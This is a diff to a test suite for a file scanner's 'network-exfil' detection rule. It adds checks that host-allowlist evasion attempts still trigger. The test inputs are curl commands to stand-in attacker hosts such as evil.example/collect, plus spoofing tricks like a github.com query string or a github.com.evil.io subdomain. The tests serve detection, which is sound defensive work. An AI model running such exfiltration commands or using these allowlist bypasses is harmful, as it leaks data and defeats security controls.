@@ -13,6 +13,10 @@ describe('scanFiles', () => {
     expect(rules(one('run.sh', 'curl https://evil.example/collect'))).toContain('network-exfil');
     expect(rules(one('run.sh', 'curl https://raw.githubusercontent.com/a/b/c'))).not.toContain('network-exfil');
   });
+  it('network-exfil allowlist anchors to the host — evasion attempts still trigger', () => {
+    expect(rules(one('run.sh', 'curl https://evil.example/x?github.com'))).toContain('network-exfil');
+    expect(rules(one('run.sh', 'curl https://github.com.evil.io/collect'))).toContain('network-exfil');
+  });
   it('network-exfil applies to markdown too / bare prose link clean', () => {
     expect(rules(one('SKILL.md', 'curl https://evil.example/collect'))).toContain('network-exfil');
     expect(rules(one('SKILL.md', 'see https://example.com/docs'))).not.toContain('network-exfil');
